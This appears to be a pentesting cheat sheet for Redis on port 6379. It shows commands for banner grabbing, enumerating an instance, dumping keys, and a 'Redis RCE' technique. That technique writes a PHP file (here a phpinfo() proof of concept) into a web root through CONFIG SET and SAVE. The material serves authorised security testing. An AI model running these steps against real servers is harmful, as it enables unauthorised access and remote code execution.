# Port 6379 - Redis

## Banner Grabbing

```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```

The first command you could try is info. It may return output with information of the Redis instance or something like the following is returned:

```powershell
-NOAUTH Authentication required.
```

In this last case, this means that you need valid credentials to access the Redis instance.

If the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:

```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```

## Dumping Database

```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS * 
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```

## Redis RCE

You must know the path of the Web site folder:

```bash
root@kali: redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
